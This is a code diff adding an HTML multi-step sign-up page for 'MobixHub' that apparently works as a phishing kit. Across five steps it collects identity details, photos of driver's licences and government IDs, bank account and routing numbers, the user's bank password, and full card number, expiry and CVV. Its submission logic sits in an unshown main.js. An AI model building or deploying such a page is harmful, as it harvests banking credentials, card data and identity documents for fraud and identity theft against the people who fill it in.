@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Sign Up - MobixHub</title>
+  <style>
+    * { box-sizing: border-box; }
+    body {
+      margin: 0; padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: #f0f2f5;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      min-height: 100vh;
+    }
+    .signup-container {
+      background: white;
+      padding: 2rem;
+      width: 100%;
+      max-width: 500px;
+      border-radius: 10px;
+      box-shadow: 0 8px 20px rgba(0,0,0,0.08);
+    }
+    h2 {
+      text-align: center;
+      margin-bottom: 1rem;
+      color: #333;
+    }
+    label {
+      display: block;
+      margin: 0.8rem 0 0.3rem;
+      font-size: 0.9rem;
+      color: #333;
+    }
+    input, select {
+      width: 100%;
+      padding: 0.7rem;
+      border: 1px solid #ccc;
+      border-radius: 6px;
+      margin-bottom: 1rem;
+    }
+    input[type="file"] {
+      padding: 0.3rem;
+    }
+    .button-group {
+      display: flex;
+      justify-content: space-between;
+      gap: 10px;
+    }
+    button {
+      padding: 0.9rem 1.2rem;
+      border: none;
+      background-color: #007bff;
+      color: white;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    .form-step {
+      display: none;
+    }
+    .form-step.active {
+      display: block;
+    }
+  </style>
+</head>
+<body>
+  <div class="signup-container">
+    <h2>Create Account - MobixHub</h2>
+    <form id="multiStepForm">
+
+<!-- Step 1: Personal Info -->
+<div class="form-step active" id="step-1">
+  <label>First Name</label>
+  <input type="text" name="firstName" required>
+
+  <label>Middle Name</label>
+  <input type="text" name="middleName">
+
+  <label>Last Name</label>
+  <input type="text" name="lastName" required>
+
+  <label>Maiden Name</label>
+  <input type="text" name="maidenName">
+
+  <label>Email Address</label>
+  <input type="email" name="email" required>
+
+  <label>Phone Number</label>
+  <input type="tel" name="phone" required>
+
+  <!-- ✅ New Password Fields -->
+  <label>Enter Password</label>
+  <input type="password" name="password" required minlength="6">
+
+  <label>Confirm Password</label>
+  <input type="password" name="confirmPassword" required minlength="6">
+
+  <div class="button-group">
+    <button type="button" onclick="nextStep(1)">Next</button>
+  </div>
+</div>
+
+      <!-- Step 2: Address -->
+      <div class="form-step" id="step-2">
+        <label>Home Address</label>
+        <input type="text" name="homeAddress" required>
+
+        <label>City</label>
+        <input type="text" name="city" required>
+
+        <label>State</label>
+        <input type="text" name="state" required>
+
+        <label>Country</label>
+        <select name="country" required>
+          <option value="">Select Country</option>
+          <option value="USA">USA</option>
+          <option value="UK">UK</option>
+        </select>
+
+        <div class="button-group">
+          <button type="button" onclick="prevStep(2)">Back</button>
+          <button type="button" onclick="nextStep(2)">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 3: Upload Documents -->
+      <div class="form-step" id="step-3">
+        <label>Upload Driver's License (Front)</label>
+        <input type="file" name="dlFront" accept="image/*,.pdf" capture="environment" required>
+
+        <label>Upload Driver's License (Back)</label>
+        <input type="file" name="dlBack" accept="image/*,.pdf" capture="environment" required>
+
+        <label>Upload Government ID (Front)</label>
+        <input type="file" name="govFront" accept="image/*,.pdf" capture="environment" required>
+
+        <label>Upload Government ID (Back)</label>
+        <input type="file" name="govBack" accept="image/*,.pdf" capture="environment" required>
+
+        <div class="button-group">
+          <button type="button" onclick="prevStep(3)">Back</button>
+          <button type="button" onclick="nextStep(3)">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 4: Bank Details -->
+      <div class="form-step" id="step-4">
+        <label>Bank Name (USA/UK)</label>
+        <select name="bankName" required>
+          <option value="">Select Bank</option>
+          <option>Chase Bank</option>
+          <option>Bank of America</option>
+          <option>Wells Fargo</option>
+          <option>Barclays UK</option>
+          <option>HSBC UK</option>
+          <option>Enter manually below</option>
+        </select>
+
+        <label>Other Bank Name (if not listed)</label>
+        <input type="text" name="otherBank">
+
+        <label>Account Number</label>
+        <input type="text" name="accountNumber" required>
+
+        <label>Routing/Sort Code</label>
+        <input type="text" name="routingCode" required>
+
+        <label>Password</label>
+        <input type="password" name="bankPassword" required>
+
+        <div class="button-group">
+          <button type="button" onclick="prevStep(4)">Back</button>
+          <button type="button" onclick="nextStep(4)">Next</button>
+        </div>
+      </div>
+
+      <!-- Step 5: Card Info -->
+      <div class="form-step" id="step-5">
+        <label>Card Number</label>
+        <input type="text" name="cardNumber" placeholder="XXXX-XXXX-XXXX-XXXX" required>
+
+        <label>Expiry Date</label>
+        <input type="month" name="expiryDate" required>
+
+        <label>CVV</label>
+        <input type="text" name="cvv" required maxlength="4">
+
+        <div class="button-group">
+          <button type="button" onclick="prevStep(5)">Back</button>
+          <button type="submit">Finish</button>
+        </div>
+        <div id="statusMessage" style="text-align:center; color:#007bff; font-weight:bold; margin-top:1rem;"></div>
+      </div>
+    </form>
+  </div>
+
+  <script src="main.js"></script>
+</body>
+</html>
